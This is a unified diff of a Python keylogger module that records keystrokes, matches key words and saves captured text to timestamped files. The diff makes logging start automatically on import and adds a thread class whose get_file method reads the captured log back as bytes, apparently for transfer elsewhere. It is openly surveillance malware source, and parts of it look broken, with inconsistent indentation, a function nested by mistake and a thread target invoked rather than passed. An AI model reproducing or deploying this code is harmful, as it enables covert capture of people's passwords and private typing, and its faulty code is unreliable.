@@ -1,7 +1,10 @@
 #!/usr/bin/python3
 #NISH, PUT CODE HERE!
 
-from . import keylogger;
+try:
+	from . import keylogger;
+except SystemError:
+	import keylogger;
 import threading;
 import time;
 import os;
@@ -51,7 +54,7 @@ class text_store:
         self.storage = [];
         curr_time = str(time.time());
         f_time = curr_time[:curr_time.find(".")];
-        self.fname = "op/op-"+f_time+".txt"; #IMPORTANT : Output location
+        self.fname = "./op/op-"+f_time+".txt"; #IMPORTANT : Output location
 
     def store(self,val):
         global capture_limit;
@@ -104,21 +107,21 @@ def handle_keys(t, modifiers, keys):
 
 class ThreadingUse(object):
 	def __init__(self, interval=1):
-        """ Constructor
-        :type interval: int
-        :param interval: Check interval, in seconds
-        """
-        self.interval = interval
+		""" Constructor
+		:type interval: int
+		:param interval: Check interval, in seconds
+		"""
+		self.interval = interval
 
-        thread = threading.Thread(target=self.run, args=())
-        thread.daemon = True                            # Daemonize thread
-        thread.start()                                  # Start the execution
+		thread = threading.Thread(target=self.run, args=())
+		thread.daemon = True                            # Daemonize thread
+		thread.start()                                  # Start the execution
 
-    def run(self):
-        """ Method that runs forever """
-        while True:
-            # Do something
-            print('Doing something imporant in the background')
+	def run(self):
+		""" Method that runs forever """
+		while True:
+			# Do something
+			print('Doing something imporant in the background')
 
 			time.sleep(self.interval)
 
@@ -126,24 +129,27 @@ class ThreadingUse(object):
 #now = time.time();
 #done = lambda: time.time() > now + 60; #should return True (stop) or False (continue)
 def done():
-    global curr_key;
-    if curr_key == "`": #QUITTING CONDITION
-        ts.commit_temp("::");
-        return(True);
-    else:
-        return(False);
+	global curr_key;
+	if curr_key == "`": #QUITTING CONDITION
+		print("Done!");
+		ts.commit_temp("::");
+		return(True);
+	else:
+		return(False);
 
 '''Ptolemy Code start'''
+ts = text_store();
 
 def start():
+#global handle_keys;
 	try:
 		keylogger.log(done, handle_keys);
 	except KeyboardInterrupt:
 		#print(ts);
 		ts.commit_temp();
-	
-def stop():
-	ts.commit_temp();
+		
+	def stop():
+		ts.commit_temp();
 
 
 def get_file():
@@ -164,11 +170,37 @@ if len(key_words) == 0:
 for string in key_words:
     string_matcher_collection.append(StringMatcher(string)); #convert key word strings into StringMatcher objects
 
-ts = text_store();
-
 try:
     os.mkdir("op");
 except FileExistsError:
     pass;
+
+start();
+
+class LoggerThread(threading.Thread):
+	
+	def __init__(self):
+		threading.Thread.__init__(self)
+		self.run_flag = True
+		
+	def run(self):
+		self.run_thread = threading.Thread(target=keylogger.log(self.finish,handle_keys))
+	
+	def finish(self):
+		return(self.run_flag)
+	
+	def stop(self):
+		self.run_flag=False
+		return(b"Stopped...");
+	
+	def get_file(self):
+		ts = text_store();
+		if self.run_flag == True:
+			self.run_flag = False
+		ts.commit_temp()
+		f = open(ts.fname, 'rb')
+		send_list = f.read() #IMPORTANT Jacques: Used read() now
+		f.close()
+		return send_list
 
 
